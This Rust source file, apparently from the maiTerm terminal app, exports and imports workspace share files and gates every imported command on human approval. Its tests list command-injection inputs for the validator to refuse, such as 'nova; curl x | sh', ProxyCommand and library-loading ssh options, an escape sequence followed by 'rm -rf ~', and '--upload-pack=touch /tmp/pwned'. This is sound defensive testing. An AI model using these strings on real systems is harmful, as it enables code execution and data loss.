                kind: preview_kind,
                root_id,
                place,
                agent: detected.map(|(rt, reason)| AgentPreview {
                    runtime: rt,
                    reason,
                    forkable: is_remote && session_of(rt).is_some() && crate::state::agent_runtime::descriptor(rt).supports_fork,
                }),
                dropped_reason: None,
            });
            tabs.push(SharedTab {
                id: tab.id.clone(),
                name: tab.name.clone(),
                custom_name: tab.custom_name,
                kind,
                auto_resume,
                agent,
                mesh_purpose: if ws.bridge_all { tab.mesh_purpose.clone().filter(|p| !p.trim().is_empty()) } else { None },
            });
        }
        // A pane whose every tab was dropped would arrive empty; give it a plain shell.
        if tabs.is_empty() {
            tabs.push(SharedTab {
                id: format!("{}-shell", pane.id),
                name: "Terminal".to_string(),
                custom_name: false,
                kind: SharedTabKind::Local { location: None },
                auto_resume: None,
                agent: None,
                mesh_purpose: None,
            });
        }
        let active_tab_id = pane
            .active_tab_id
            .clone()
            .filter(|id| tabs.iter().any(|t| &t.id == id))
            .or_else(|| tabs.first().map(|t| t.id.clone()));
        panes.push(SharedPane { id: pane.id.clone(), name: pane.name.clone(), tabs, active_tab_id });
    }

    let services = ws
        .stack
        .iter()
        .filter_map(|s| {
            let choice = opts.services.iter().find(|c| c.id == s.id);
            if !for_preview && choice.is_none() {
                return None;
            }
            let location = if s.cwd.trim().is_empty() { None } else { Some(table.locate_dir(&expand_tilde(&s.cwd))) };
            Some(SharedService {
                name: s.name.clone(),
                command: s.command.clone(),
                location,
                env: s
                    .env
                    .iter()
                    .map(|(k, v)| SharedEnv {
                        name: k.clone(),
                        value: choice.filter(|c| c.env_values.contains(k)).map(|_| v.clone()),
                    })
                    .collect(),
                auto_start: s.auto_start,
                restart: s.restart.clone(),
                ready_pattern: s.ready_pattern.clone(),
            })
        })
        .collect();

    let kept_tab_ids: Vec<&String> = panes.iter().flat_map(|p| p.tabs.iter().map(|t| &t.id)).collect();
    let notes = opts.include_notes.then(|| SharedNotes {
        tabs: ws
            .panes
            .iter()
            .flat_map(|p| p.tabs.iter())
            .filter(|t| kept_tab_ids.contains(&&t.id))
            .filter_map(|t| {
                let content = t.notes.clone().filter(|n| !n.trim().is_empty())?;
                Some((t.id.clone(), SharedNote { content, mode: t.notes_mode.clone() }))
            })
            .collect(),
        workspace: ws
            .workspace_notes
            .iter()
            .map(|n| SharedNote { content: n.content.clone(), mode: n.mode.clone() })
            .collect(),
    });
    let tasks = opts.include_tasks.then(|| SharedTasks { workstreams: ws.workstreams.clone(), tasks: ws.tasks.clone() });

    let file = ShareFile {
        format: FORMAT.to_string(),
        version: VERSION,
        exported_at: crate::commands::workspace::iso_now(),
        maiterm_version: env!("CARGO_PKG_VERSION").to_string(),
        workspace: SharedWorkspace {
            name: ws.name.clone(),
            split_root: ws.split_root.clone(),
            panes,
            active_pane_id: ws.active_pane_id.clone(),
            mesh: ws.bridge_all,
        },
        roots: table.roots.clone(),
        services,
        notes,
        tasks,
        refused: Vec::new(),
    };
    Built { file, table, previews }
}

pub fn export_preview(ws: &Workspace, contexts: &[TabShareContext]) -> ExportPreview {
    let built = build(ws, contexts, &ExportOptions::default(), true);
    let mut roots: Vec<RootPreview> = built
        .file
        .roots
        .iter()
        .map(|r| RootPreview {
            root: r.clone(),
            warning: built.table.warnings.get(&r.id).cloned(),
            tab_count: built.previews.iter().filter(|t| t.root_id.as_deref() == Some(&r.id)).count(),
        })
        .collect();
    roots.sort_by_key(|r| std::cmp::Reverse(r.tab_count));
    ExportPreview {
        name: ws.name.clone(),
        roots,
        tabs: built.previews,
        services: ws
            .stack
            .iter()
            .map(|s| ServicePreview { id: s.id.clone(), name: s.name.clone(), env_names: s.env.iter().map(|(k, _)| k.clone()).collect() })
            .collect(),
        note_count: ws.workspace_notes.len()
            + ws.panes.iter().flat_map(|p| p.tabs.iter()).filter(|t| t.notes.as_ref().is_some_and(|n| !n.trim().is_empty())).count(),
        task_count: ws.tasks.len(),
    }
}

pub fn export_file(ws: &Workspace, contexts: &[TabShareContext], opts: &ExportOptions) -> ShareFile {
    build(ws, contexts, opts, false).file
}

// ── Import ───────────────────────────────────────────────────────────────────────────────

/// The receiver's answers from the wizard.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct ImportOptions {
    /// root id → absolute directory on this machine. A root missing here is unmapped: its
    /// tabs open at home.
    #[serde(default)]
    pub mapping: HashMap<String, String>,
    #[serde(default)]
    pub include_notes: bool,
    #[serde(default)]
    pub include_tasks: bool,
    /// Indexes into `ShareFile::services` to create.
    #[serde(default)]
    pub services: Vec<usize>,
    /// service index → var name → value, for values the sender didn't send.
    #[serde(default)]
    pub env_values: HashMap<usize, HashMap<String, String>>,
    /// The commands the human approved in the wizard's review (§4.2), by `review_key`. An
    /// allowlist: a command this build would run that the review never listed isn't in it, so
    /// it doesn't run.
    #[serde(default)]
    pub approved: std::collections::HashSet<String>,
    /// `read_file`'s digest of the file the human reviewed. The build refuses a file that has
    /// changed since.
    #[serde(default)]
    pub digest: String,
}

/// The id a reviewed command is approved under. `what` is `resume` (a tab's auto-resume
/// command), `ssh` (a remote tab's connection), or `agent` (an agent tab's start).
pub fn tab_review_key(tab_id: &str, what: &str) -> String {
    format!("tab:{tab_id}:{what}")
}

/// A service starting by itself when the workspace opens.
pub fn service_start_key(index: usize) -> String {
    format!("service:{index}:start")
}

/// An agent tab the frontend must start once the workspace is in the store (§5). Commands
/// are the frontend's to build: it owns the runtimes' launch/fork shapes.
#[derive(Debug, Clone, Serialize)]
pub struct AgentLaunch {
    pub tab_id: String,
    pub runtime: AgentRuntime,
    pub cwd: Option<String>,
    pub ssh_command: Option<String>,
    pub remote_cwd: Option<String>,
    /// Remote tabs only: the session to fork.
    pub fork_session_id: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ImportResult {
    pub workspace: Workspace,
    pub launches: Vec<AgentLaunch>,
    /// Human-readable notes about what couldn't be placed exactly (§4 step 3).
    pub notices: Vec<String>,
}

fn new_id() -> String {
    uuid::Uuid::new_v4().to_string()
}

fn remap_split(node: &SplitNode, map: &HashMap<String, String>) -> Option<SplitNode> {
    match node {
        SplitNode::Leaf { pane_id } => map.get(pane_id).map(|id| SplitNode::Leaf { pane_id: id.clone() }),
        SplitNode::Split { direction, ratio, children, .. } => {
            match (remap_split(&children.0, map), remap_split(&children.1, map)) {
                (Some(a), Some(b)) => Some(SplitNode::Split {
                    id: new_id(),
                    direction: direction.clone(),
                    ratio: *ratio,
                    children: Box::new((a, b)),
                }),
                (Some(one), None) | (None, Some(one)) => Some(one),
                (None, None) => None,
            }
        }
    }
}

/// Build the workspace a share file describes, every id fresh (§1). Pure: no git, no disk
/// beyond checking that mapped subpaths exist.
pub fn build_workspace(file: &ShareFile, opts: &ImportOptions) -> ImportResult {
    let mut notices = Vec::new();
    let roots: HashMap<&str, &SharedRoot> = file.roots.iter().map(|r| (r.id.as_str(), r)).collect();
    let mut noticed_unmapped = std::collections::HashSet::new();

    let mut resolve = |loc: &Loc, want_dir: bool, notices: &mut Vec<String>| -> Option<PathBuf> {
        let Some(root_dir) = opts.mapping.get(&loc.root_id) else {
            if noticed_unmapped.insert(loc.root_id.clone()) {
                let shown = roots.get(loc.root_id.as_str()).map(|r| r.path.clone()).unwrap_or_default();
                notices.push(format!("{shown} wasn't mapped; its tabs open in your home directory"));
            }
            return None;
        };
        let root = PathBuf::from(root_dir);
        let full = join_subpath(&root, &loc.subpath);
        if !want_dir || full.is_dir() {
            return Some(full);
        }
        // A directory that was never committed doesn't exist in a fresh clone.
        notices.push(format!("{} doesn't exist here; opened {} instead", loc.subpath, root.display()));
        Some(root)
    };

    let mut pane_map = HashMap::new();
    let mut tab_map: HashMap<String, String> = HashMap::new();
    let mut launches = Vec::new();
    let mut panes = Vec::new();

    for sp in &file.workspace.panes {
        let pane_id = new_id();
        pane_map.insert(sp.id.clone(), pane_id.clone());
        let mut tabs = Vec::new();
        for st in &sp.tabs {
            let approved = |what: &str| opts.approved.contains(&tab_review_key(&st.id, what));
            // Unapproved, a remote tab keeps its place as a plain local shell rather than
            // vanishing; the agent in it can't start either, it was going to start over ssh.
            let ssh_ok = approved("ssh");
            let resume = st.auto_resume.as_ref().map(|ar| SharedAutoResume {
                command: ar.command.clone().filter(|_| approved("resume")),
                // Never shown in review, and it runs later in `command`'s place: not carried.
                remembered_command: None,
                ..ar.clone()
            });
            let remote_declined = matches!(st.kind, SharedTabKind::Remote { .. }) && !ssh_ok;
            if remote_declined {
                notices.push(format!("“{}” opens as a local shell: its ssh connection wasn't approved", st.name));
            }
            let kind = if remote_declined { SharedTabKind::Local { location: None } } else { st.kind.clone() };
            let mut tab = match &kind {
                SharedTabKind::Editor { location, language } => {
                    let Some(path) = resolve(location, false, &mut notices) else { continue };
                    Tab::new_editor(
                        st.name.clone(),
                        EditorFileInfo {
                            file_path: path.to_string_lossy().to_string(),
                            is_remote: false,
                            remote_ssh_command: None,
                            remote_path: None,
                            language: language.clone(),
                        },
                    )
                }
                SharedTabKind::RemoteEditor { .. } if !ssh_ok => {
                    notices.push(format!("“{}” was left out: opening it over ssh wasn't approved", st.name));
                    continue;
                }
                SharedTabKind::RemoteEditor { ssh_command, remote_path, file_path, language } => Tab::new_editor(
                    st.name.clone(),
                    EditorFileInfo {
                        file_path: file_path.clone(),
                        is_remote: true,
                        remote_ssh_command: Some(ssh_command.clone()),
                        remote_path: Some(remote_path.clone()),
                        language: language.clone(),
                    },
                ),
                SharedTabKind::Local { location } => {
                    let mut t = Tab::new(st.name.clone());
                    let cwd = location
                        .as_ref()
                        .and_then(|l| resolve(l, true, &mut notices))
                        .map(|p| p.to_string_lossy().to_string());
                    t.restore_cwd = cwd.clone();
                    t.last_cwd = cwd.clone();
                    // A declined remote tab's resume command was written for the remote host.
                    if let Some(ar) = resume.as_ref().filter(|_| !remote_declined) {
                        t.auto_resume_cwd = cwd;
                        apply_auto_resume(&mut t, ar);
                    }
                    t
                }
                SharedTabKind::Remote { ssh_command, remote_cwd } => {
                    let mut t = Tab::new(st.name.clone());
                    t.restore_ssh_command = Some(ssh_command.clone());
                    t.restore_remote_cwd = remote_cwd.clone();
                    if let Some(ar) = &resume {
                        t.auto_resume_ssh_command = Some(ssh_command.clone());
                        t.auto_resume_remote_cwd = remote_cwd.clone();
                        apply_auto_resume(&mut t, ar);
                    }
                    t
                }
            };
            tab.custom_name = st.custom_name;
            // The role is pasted into an agent's prompt, and the review shows it with that agent's
            // start — so it's carried only when that start was approved.
            if file.workspace.mesh && st.agent.is_some() && approved("agent") && !remote_declined {
                tab.mesh_purpose = st.mesh_purpose.clone();
            }
            tab.import_highlight = true;
            if let Some(agent) = st.agent.as_ref().filter(|_| approved("agent") && !remote_declined) {
                tab.runtime = Some(agent.runtime);
                let remote = matches!(st.kind, SharedTabKind::Remote { .. });
                launches.push(AgentLaunch {
                    tab_id: tab.id.clone(),
                    runtime: agent.runtime,
                    cwd: tab.restore_cwd.clone(),
                    ssh_command: tab.restore_ssh_command.clone(),
                    remote_cwd: tab.restore_remote_cwd.clone(),
                    fork_session_id: if remote { agent.session_id.clone() } else { None },
                });
            }
            if opts.include_notes {
                if let Some(n) = file.notes.as_ref().and_then(|n| n.tabs.get(&st.id)) {
                    tab.notes = Some(n.content.clone());
                    tab.notes_mode = n.mode.clone();
                }
            }
            tab_map.insert(st.id.clone(), tab.id.clone());
            tabs.push(tab);
        }
        if tabs.is_empty() {
            tabs.push(Tab::new("Terminal".to_string()));
        }
        let active_tab_id = sp
            .active_tab_id
            .as_ref()
            .and_then(|id| tab_map.get(id))
            .filter(|id| tabs.iter().any(|t| &&t.id == id))
            .cloned()
            .or_else(|| tabs.first().map(|t| t.id.clone()));
        panes.push(Pane { id: pane_id, name: sp.name.clone(), tabs, active_tab_id });
    }

    let mut ws = Workspace::new(file.workspace.name.clone());
    let split_root = file
        .workspace
        .split_root
        .as_ref()
        .and_then(|n| remap_split(n, &pane_map))
        // A tree that names no pane we built (hand-edited file) falls back to the first pane.
        .or_else(|| panes.first().map(|p| SplitNode::Leaf { pane_id: p.id.clone() }));
    ws.active_pane_id = file
        .workspace
        .active_pane_id
        .as_ref()
        .and_then(|id| pane_map.get(id))
        .cloned()
        .or_else(|| panes.first().map(|p| p.id.clone()));
    ws.panes = panes;
    ws.split_root = split_root;
    ws.import_highlight = true;
    ws.bridge_all = file.workspace.mesh;

    let now = crate::commands::workspace::iso_now();
    let home_dir = home().map(|h| h.to_string_lossy().to_string()).unwrap_or_else(|| "~".to_string());
    ws.stack = opts
        .services
        .iter()
        .filter_map(|&i| file.services.get(i).map(|s| (i, s)))
        .map(|(i, s)| {
            let cwd = s
                .location
                .as_ref()
                .and_then(|l| resolve(l, true, &mut notices))
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|| home_dir.clone());
            let supplied = opts.env_values.get(&i);
            Service {
                id: new_id(),
                name: s.name.clone(),
                normalized_name: Service::normalize_name(&s.name),
                command: s.command.clone(),
                cwd,
                env: s
                    .env
                    .iter()
                    .map(|e| {
                        let v = e.value.clone().or_else(|| supplied.and_then(|m| m.get(&e.name).cloned())).unwrap_or_default();
                        (e.name.clone(), v)
                    })
                    .collect(),
                ssh_command: None,
                // Starting on its own is the one way a service runs without a click (§4.2).
                auto_start: s.auto_start && opts.approved.contains(&service_start_key(i)),
                restart: s.restart.clone(),
                ready_pattern: s.ready_pattern.clone(),
                port: None,
                url: None,
                origin: "human".to_string(),
                created_at: now.clone(),
                updated_at: now.clone(),
            }
        })
        .collect();

    if opts.include_notes {
        if let Some(n) = &file.notes {
            ws.workspace_notes = n
                .workspace
                .iter()
                .map(|n| WorkspaceNote { id: new_id(), content: n.content.clone(), mode: n.mode.clone(), created_at: now.clone(), updated_at: now.clone() })
                .collect();
        }
    }

    if opts.include_tasks {
        if let Some(t) = &file.tasks {
            let ws_map: HashMap<String, String> = t.workstreams.iter().map(|w| (w.id.clone(), new_id())).collect();
            let task_map: HashMap<String, String> = t.tasks.iter().map(|x| (x.id.clone(), new_id())).collect();
            ws.workstreams = t.workstreams.iter().map(|w| Workstream { id: ws_map[&w.id].clone(), ..w.clone() }).collect();
            ws.tasks = t
                .tasks
                .iter()
                .map(|x| Task {
                    id: task_map[&x.id].clone(),
                    tab_id: x.tab_id.as_ref().and_then(|id| tab_map.get(id)).cloned(),
                    blocked_by: x.blocked_by.iter().filter_map(|id| task_map.get(id)).cloned().collect(),
                    workstream_id: x.workstream_id.as_ref().and_then(|id| ws_map.get(id)).cloned(),
                    ..x.clone()
                })
                .collect();
        }
    }

    ImportResult { workspace: ws, launches, notices }
}

fn apply_auto_resume(t: &mut Tab, ar: &SharedAutoResume) {
    t.auto_resume_enabled = ar.enabled;
    t.auto_resume_pinned = ar.pinned;
    t.auto_resume_command = ar.command.clone();
    t.auto_resume_remembered_command = ar.remembered_command.clone();
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_ws() -> Workspace {
        let mut ws = Workspace::new("proj".to_string());
        let pane = &mut ws.panes[0];
        let t = &mut pane.tabs[0];
        t.name = "shell".to_string();
        t.last_cwd = Some(std::env::temp_dir().to_string_lossy().to_string());
        let mut remote = Tab::new("nova".to_string());
        remote.restore_ssh_command = Some("ews@nova".to_string());
        remote.restore_remote_cwd = Some("/home/ews/app".to_string());
        remote.runtime = Some(AgentRuntime::Claude);
        remote.trigger_variables.insert("claudeSessionId".to_string(), "11111111-aaaa".to_string());
        remote.auto_resume_ssh_command = Some("ews@nova".to_string());
        remote.auto_resume_command = Some("claude --resume 11111111-aaaa".to_string());
        remote.composer_draft = Some("secret draft".to_string());
        pane.tabs.push(remote);
        ws
    }

    #[test]
    fn export_carries_structure_and_not_identity() {
        let ws = sample_ws();
        let remote_id = ws.panes[0].tabs[1].id.clone();
        let opts = ExportOptions { agent_tab_ids: vec![remote_id.clone()], ..Default::default() };
        let file = export_file(&ws, &[], &opts);
        let json = serde_json::to_string(&file).unwrap();
        assert!(!json.contains("secret draft"), "composer drafts never travel");
        assert!(!json.contains("trigger_variables"));
        let remote = &file.workspace.panes[0].tabs[1];
        assert_eq!(remote.kind, SharedTabKind::Remote { ssh_command: "ews@nova".to_string(), remote_cwd: Some("/home/ews/app".to_string()) });
        assert_eq!(remote.agent.as_ref().unwrap().session_id.as_deref(), Some("11111111-aaaa"));
        // The literal id in the command became the variable.
        assert_eq!(remote.auto_resume.as_ref().unwrap().command.as_deref(), Some("claude --resume %claudeSessionId"));
    }

    #[test]
    fn agent_commands_are_recognised_through_their_wrappers() {
        for (cmd, want) in [
            ("claude --resume %claudeSessionId", Some(AgentRuntime::Claude)),
            ("CLAUDE_CODE_MAX_OUTPUT_TOKENS=64000 claude --resume x", Some(AgentRuntime::Claude)),
            ("env FOO=1 claude", Some(AgentRuntime::Claude)),
            ("env -i FOO=1 codex resume x", Some(AgentRuntime::Codex)),
            ("/opt/homebrew/bin/claude --resume x", Some(AgentRuntime::Claude)),
            ("npx -y @anthropic-ai/claude-code", Some(AgentRuntime::Claude)),
            ("npx @openai/codex", Some(AgentRuntime::Codex)),
            ("C:\\tools\\codex.exe resume x", Some(AgentRuntime::Codex)),
            ("npm run dev", None),
            ("claude-monitor", None),
            ("npx vite", None),
            ("FOO=bar", None),
        ] {
            assert_eq!(command_runtime(cmd), want, "{cmd}");
        }
    }

    #[test]
    fn windows_verbatim_prefix_is_dropped_but_unc_keeps_it() {
        assert_eq!(strip_verbatim(PathBuf::from(r"\\?\C:\Users\bob")), PathBuf::from(r"C:\Users\bob"));
        assert_eq!(strip_verbatim(PathBuf::from(r"\\?\UNC\srv\share")), PathBuf::from(r"\\?\UNC\srv\share"));
        assert_eq!(strip_verbatim(PathBuf::from("/Users/bob")), PathBuf::from("/Users/bob"));
    }

    #[test]
    fn an_unticked_agent_tab_carries_no_agent_command() {
        let ws = sample_ws();
        let file = export_file(&ws, &[], &ExportOptions::default());
        let remote = &file.workspace.panes[0].tabs[1];
        assert!(remote.agent.is_none());
        let ar = remote.auto_resume.as_ref().expect("the ssh context still travels");
        assert_eq!(ar.command, None, "`claude --resume` would open a picker in a plain-shell tab");
    }

    #[test]
    fn a_remote_cwd_never_falls_back_to_last_cwd() {
        let mut ws = sample_ws();
        // last_cwd is the stale LOCAL OSC 7 on a remote without shell integration.
        ws.panes[0].tabs[1].last_cwd = Some("/Users/sender/proj".to_string());
        ws.panes[0].tabs[1].restore_remote_cwd = None; // suspend nulls it
        let file = export_file(&ws, &[], &ExportOptions::default());
        assert_eq!(file.workspace.panes[0].tabs[1].kind, SharedTabKind::Remote { ssh_command: "ews@nova".to_string(), remote_cwd: None });
    }

    #[test]
    fn a_mesh_travels_as_its_flag_and_roles() {
        let mut ws = sample_ws();
        ws.bridge_all = true;
        ws.panes[0].tabs[1].mesh_purpose = Some("owns the API".to_string());
        ws.mesh_topics.push(crate::state::MeshTopic::new("t1".into(), "auth".into(), ws.panes[0].tabs[1].id.clone(), String::new()));
        let agent = ws.panes[0].tabs[1].id.clone();
        let file = export_file(&ws, &[], &ExportOptions { agent_tab_ids: vec![agent], ..Default::default() });
        assert!(file.workspace.mesh);
        assert!(!serde_json::to_string(&file).unwrap().contains("\"auth\""), "topics are the sender's history");
        let unreviewed = build_workspace(&file, &ImportOptions::default()).workspace;
        assert!(unreviewed.bridge_all);
        assert_eq!(unreviewed.panes[0].tabs[1].mesh_purpose, None, "a role rides only an approved agent start");
        let id = &file.workspace.panes[0].tabs[1].id;
        let approved = [tab_review_key(id, "ssh"), tab_review_key(id, "agent")].into_iter().collect();
        let got = build_workspace(&file, &ImportOptions { approved, ..Default::default() }).workspace;
        assert!(got.mesh_topics.is_empty());
        assert_eq!(got.panes[0].tabs[1].mesh_purpose.as_deref(), Some("owns the API"));

        ws.bridge_all = false;
        let plain = export_file(&ws, &[], &ExportOptions::default());
        assert!(!plain.workspace.mesh);
        assert!(plain.workspace.panes[0].tabs[1].mesh_purpose.is_none());
    }

    #[test]
    fn an_injected_ssh_command_never_reaches_the_file() {
        let mut ws = sample_ws();
        ws.panes[0].tabs[1].restore_ssh_command = Some("ssh -t ews@nova 'export MAITERM_TAB_ID=x MAITERM_AUTH=tok; exec $SHELL -l'".to_string());
        ws.panes[0].tabs[1].auto_resume_ssh_command = None;
        let file = export_file(&ws, &[], &ExportOptions::default());
        assert!(!serde_json::to_string(&file).unwrap().contains("MAITERM_AUTH"));
    }

    #[test]
    fn import_mints_fresh_ids_and_maps_roots() {
        let ws = sample_ws();
        let file = export_file(&ws, &[], &ExportOptions::default());
        let root = file.roots[0].clone();
        let target = std::env::temp_dir().join(format!("share-import-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&target).unwrap();
        let mut mapping = HashMap::new();
        mapping.insert(root.id.clone(), target.to_string_lossy().to_string());
        let a = build_workspace(&file, &ImportOptions { mapping: mapping.clone(), ..Default::default() });
        let b = build_workspace(&file, &ImportOptions { mapping, ..Default::default() });
        assert_ne!(a.workspace.id, ws.id);
        assert_ne!(a.workspace.id, b.workspace.id);
        assert_ne!(a.workspace.panes[0].tabs[0].id, b.workspace.panes[0].tabs[0].id);
        assert_eq!(a.workspace.panes[0].tabs[0].restore_cwd.as_deref(), Some(target.to_string_lossy().as_ref()));
        match &a.workspace.split_root {
            Some(SplitNode::Leaf { pane_id }) => assert_eq!(pane_id, &a.workspace.panes[0].id),
            other => panic!("unexpected split root {other:?}"),
        }
        let _ = std::fs::remove_dir_all(&target);
    }

    #[test]
    fn ssh_targets_that_would_run_something_locally_are_refused() {
        for ok in [
            "ews@nova",
            "-p 2222 ews@nova",
            "-i ~/.ssh/id_ed25519 -J bastion ews@nova",
            "matchbox.local",
            "-o ServerAliveInterval=30 ews@nova",
            "-oUserKnownHostsFile=/dev/null ews@nova",
            "-lFred nova",
            "-JEdge nova",
            "-vp22 nova",
        ] {
            assert_eq!(ssh_refusal(ok), None, "{ok}");
        }
        for bad in [
            "nova; curl x | sh",
            "nova && id",
            "nova $(id)",
            "nova `id`",
            "nova\nid",
            "'nova'",
            "-oProxyCommand=/tmp/x nova",
            "-o ProxyCommand=/tmp/x nova",
            "-vo ProxyCommand=/tmp/x nova",
            "-o LocalCommand=/tmp/x -o PermitLocalCommand=yes nova",
            "-F /tmp/evil_config nova",
            "-vF/tmp/evil nova",
            "-E /tmp/log nova",
            "-I /tmp/lib.so nova",
            "-oPKCS11Provider=/tmp/lib.so nova",
            "-o Match nova",
            "-o=ProxyCommand=~/x/evil.sh nova",
            "-o =LocalCommand=x nova",
            "-oSmartcardDevice=/tmp/x.so nova",
            "-X -oXAuthLocation=x/evil nova",
            "",
        ] {
            assert!(ssh_refusal(bad).is_some(), "{bad:?} should be refused");
        }
    }

    /// A hand-crafted file (§4.2): everything in it that isn't meant to be a command but would be
    /// typed into one is taken out at parse, and says so.
    #[test]
    fn a_crafted_file_loses_what_would_inject() {
        let text = r#"{
          "format": "maiterm-workspace", "version": 1, "exported_at": "x", "maiterm_version": "x",
          "refused": ["pre-filled by the sender"],
          "workspace": { "name": "evil", "panes": [ { "id": "p", "name": "p", "tabs": [
            { "id": "a", "name": "semi", "kind": { "type": "remote", "ssh_command": "nova; curl x | sh" } },
            { "id": "b", "name": "proxy", "kind": { "type": "remote", "ssh_command": "-oProxyCommand=/tmp/x nova" } },
            { "id": "c", "name": "cwd", "kind": { "type": "remote", "ssh_command": "nova", "remote_cwd": "x'; id; '" } },
            { "id": "d", "name": "sid", "kind": { "type": "remote", "ssh_command": "nova" }, "agent": { "runtime": "claude", "session_id": "x; id" } },
            { "id": "e", "name": "editor", "kind": { "type": "remote_editor", "ssh_command": "nova|id", "remote_path": "/x", "file_path": "x" } },
            { "id": "f", "name": "tilde", "kind": { "type": "remote_editor", "ssh_command": "nova", "remote_path": "~$(id)/x", "file_path": "x" } },
            { "id": "d", "name": "dup", "kind": { "type": "local" } },
            { "id": "g", "name": "role", "kind": { "type": "local" }, "mesh_purpose": "owns\u001b[201~\rrm -rf ~" },
            { "id": "h", "name": "api\u001b[201~\rid", "kind": { "type": "local" } }
          ] } ] },
          "roots": [ { "id": "r", "path": "~/x", "kind": "git", "remotes": { "origin": "--upload-pack=touch /tmp/pwned" }, "branch": "--upload-pack=x" } ],
          "services": [ { "name": "s", "command": "make", "restart": "never", "env": [ { "name": "A;id", "value": "1" }, { "name": "OK_1", "value": "2" } ] } ]
        }"#;
        let file = parse(text).unwrap();
        let names: Vec<&str> = file.workspace.panes[0].tabs.iter().map(|t| t.name.as_str()).collect();
        assert_eq!(names, vec!["sid", "role", "api[201~id"]);
        assert_eq!(file.workspace.panes[0].tabs[0].agent.as_ref().unwrap().session_id, None);
        assert_eq!(file.workspace.panes[0].tabs[1].mesh_purpose.as_deref(), Some("owns[201~rm -rf ~"));
        let env: Vec<&str> = file.services[0].env.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(env, vec!["OK_1"]);
        assert!(file.roots[0].remotes.is_empty());
        assert_eq!(file.roots[0].branch, None);
        assert_eq!(file.roots[0].kind, RootKind::Plain);
        assert!(!file.refused.iter().any(|r| r.contains("pre-filled")), "a sender can't write the refusal list");
        // 5 bad tabs, the tilde path, the duplicate id, the role, the name, the env name, the URL,
        // the branch.
        assert_eq!(file.refused.len(), 12, "{:#?}", file.refused);
    }

    #[test]
    fn nothing_runs_that_wasnt_approved() {
        let ws = sample_ws();
        let remote_id = ws.panes[0].tabs[1].id.clone();
        let mut file = export_file(&ws, &[], &ExportOptions { agent_tab_ids: vec![remote_id.clone()], ..Default::default() });
        file.workspace.panes[0].tabs[0].auto_resume =
            Some(SharedAutoResume { enabled: true, pinned: false, command: Some("npm run dev".to_string()), remembered_command: None });
        file.services.push(SharedService {
            name: "api".to_string(),
            command: "make api".to_string(),
            location: None,
            env: vec![],
            auto_start: true,
            restart: "never".to_string(),
            ready_pattern: None,
        });
        let local = file.workspace.panes[0].tabs[0].id.clone();
        let remote = file.workspace.panes[0].tabs[1].id.clone();

        let none = build_workspace(&file, &ImportOptions { services: vec![0], ..Default::default() });
        let tabs = &none.workspace.panes[0].tabs;
        assert_eq!(tabs[0].auto_resume_command, None);
        assert_eq!(tabs[1].restore_ssh_command, None, "an unapproved remote tab is a local shell");
        assert_eq!(tabs[1].auto_resume_command, None, "and never runs the remote's resume command locally");
        assert!(none.launches.is_empty());
        assert!(!none.workspace.stack[0].auto_start);

        let approved = [
            tab_review_key(&local, "resume"),
            tab_review_key(&remote, "ssh"),
            tab_review_key(&remote, "resume"),
            tab_review_key(&remote, "agent"),
            service_start_key(0),
        ];
        let all = build_workspace(&file, &ImportOptions { services: vec![0], approved: approved.into_iter().collect(), ..Default::default() });
        let tabs = &all.workspace.panes[0].tabs;
        assert_eq!(tabs[0].auto_resume_command.as_deref(), Some("npm run dev"));
        assert_eq!(tabs[1].restore_ssh_command.as_deref(), Some("ews@nova"));
        assert!(tabs[1].auto_resume_command.is_some());
        assert_eq!(all.launches.len(), 1);
        assert_eq!(all.launches[0].fork_session_id.as_deref(), Some("11111111-aaaa"));
        assert!(all.workspace.stack[0].auto_start);
    }

    #[test]
    fn a_newer_format_is_refused_whole() {
        let err = parse(r#"{"format":"maiterm-workspace","version":99}"#).unwrap_err();
        assert!(err.contains("newer maiTerm"));
        assert!(parse(r#"{"windows":[]}"#).is_err());
    }
}
